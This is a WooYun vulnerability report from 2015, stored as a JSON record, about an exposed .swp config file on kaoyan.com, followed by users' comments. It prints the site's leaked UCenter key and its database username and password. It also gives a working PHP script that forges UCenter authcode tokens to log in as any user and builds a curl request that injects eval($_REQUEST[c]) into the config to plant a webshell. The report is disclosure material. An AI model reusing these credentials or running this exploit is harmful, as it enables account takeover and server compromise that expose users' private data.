{"id": 45254, "wybug_id": "wooyun-2015-0103256", "wybug_title": "考研网运维不当敏感信息导致700W用户任意登陆", "wybug_corp": "kaoyan.com", "wybug_author": "撸撸侠", "wybug_date": "2015-03-23 17:08", "wybug_open_date": "2015-03-28 17:10", "wybug_type": "系统/服务运维配置不当", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露", "安全意识不足", "默认配置不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-28：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 考研网运维不当敏感信息导致任意用户登陆（700W） 详细说明：  敏感信息泄漏http://bbs.kaoyancn.com/config/.config_ucenter.php.swp\ndefine('UC_PPP', 20); define('UC_IP', '192.168.1.43'); //define('UC_IP', '219.232.49.217'); define('UC_APPID', '1'); define('UC_API', 'http://account.kaoyan.com'); define('UC_KEY', '29x4u2b3qanefaJaO2P1T5eclcj3Qemal7t143lbq9pcNchcvcT8U6S1Qcg6a6J1'); define('UC_CHARSET', 'utf-8');  define('UC_DBCONNECT', 0); define('UC_DBTABLEPRE', '`kaoyan_account`.uc_'); define('UC_DBCHARSET', 'utf8'); define('UC_DBNAME', 'kaoyan_account'); define('UC_DBPW', 'Rj3ij2RlVAVd'); define('UC_DBUSER', 'kaoyan_account'); define('UC_DBHOST', '192.168.1.38');  define('UC_CONNECT', 'mysql');\n泄漏了uc_key及数据库账号等任意用户登陆脚本：http://zone.wooyun.org/content/10580\n<?php$key = 'cebbvi5s15BSiMXteaP9TNCIz5K5jAVekw7tcV9TqmYCNT5VOJdu7toOxipTX';#少年 uc_key 写在这里$url = 'http://localhost/api/uc.php';#$arg = 'action=updateapps&time='.time();#拿webshell：http://localhost/config/config_ucenter.php 密码：c$arg = 'action=synlogin&uid=1&username=admin&time='.time();#登录任意用户#其他的 可以看api里的接口，格式：action=接口&参数echo 'curl \"'.$url.'?code='.rawurlencode(authcode($arg,'ENCODE',$key)).'\" -d \"'.addslashes('<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><root><item id=\"UC_API\">https://sb\\');eval(\\$_REQUEST[c]);#</item></root>').'\"';#登录任意用户直接访问url即可，getshell可以curl或者用其他工具post提交function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {  $ckey_length = 4;  $key = md5($key);  $keya = md5(substr($key, 0, 16));  $keyb = md5(substr($key, 16, 16));  $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';  $cryptkey = $keya.md5($keya.$keyc);  $key_length = strlen($cryptkey);  $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;  $string_length = strlen($string);  $result = '';  $box = range(0, 255);  $rndkey = array();  for($i = 0; $i <= 255; $i++) {    $rndkey[$i] = ord($cryptkey[$i % $key_length]);  }  for($j = $i = 0; $i < 256; $i++) {    $j = ($j + $box[$i] + $rndkey[$i]) % 256;    $tmp = $box[$i];    $box[$i] = $box[$j];    $box[$j] = $tmp;  }  for($a = $j = $i = 0; $i < $string_length; $i++) {    $a = ($a + 1) % 256;    $j = ($j + $box[$a]) % 256;    $tmp = $box[$a];    $box[$a] = $box[$j];    $box[$j] = $tmp;    $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));  }  if($operation == 'DECODE') {    if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {      return substr($result, 26);    } else {      return '';    }  } else {    return $keyc.str_replace('=', '', base64_encode($result));  }}?>\n   漏洞证明：  \n\n\n\n   修复方案：     版权声明：转载请注明来源 撸撸侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-03-28 17:10 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 2015-08-03：谢谢撸撸侠，我们已经修复了  ", "replys": "漏洞评价：\n评论\n     2015-03-23 17:10 |    \t\t管管侠 \t\t\t( 核心白帽子 |\t\t\t        Rank:1368 漏洞数:108        | 休息几日，让你们先装会！！！)\t\t \n  哥，我是@管管侠    \n     2015-03-23 17:20 |    \t\t茜茜公主 \t\t\t( 普通白帽子  |\t\t\t        Rank:2360 漏洞数:406        | 家里二宝出生，这几个月忙着把屎把尿...忒...)\t\t \n  我是来看撸撸兄弟的    \n     2015-03-23 17:32 |    \t\t撸撸侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:250 漏洞数:26        | 我是撸撸侠)\t\t \n  @管管侠 弟，你咋也来了呢    \n     2015-03-23 17:36 |    \t\tdepycode \t\t\t( 普通白帽子  |\t\t\t        Rank:275 漏洞数:44        | 关注网络安全，提高技术！)\t\t \n  撸管兄弟啊    \n     2015-03-23 17:38 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:66        | 我是一只毛毛虫。)\t\t \n  撸管兄弟啊    \n     2015-03-23 19:19 |    \t\t淡蓝色の忧伤 \t\t\t( 普通白帽子  |\t\t\t        Rank:172 漏洞数:26        | 开启审计php代码模式      (⊙v⊙)嗯)\t\t \n  撸管兄弟a~~~~    \n     2015-03-23 19:53 |    \t\tYuku \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:19        | 酱油哥)\t\t \n  swp？    \n     2015-03-24 09:34 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  互撸兄弟啊~    \n     2015-03-24 12:27 |    \t\ts3xy \t\t\t( 核心白帽子 |\t\t\t        Rank:832 漏洞数:113        | 相濡以沫，不如相忘于江湖)\t\t \n  互撸娃~    \n     2015-03-25 21:15 |    \t\t东方不败 \t\t\t( 普通白帽子  |\t\t\t        Rank:440 漏洞数:66        | 日出东方，唯我不败。)\t\t \n  特来膜拜撸管兄弟 @撸撸侠 @管管侠    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}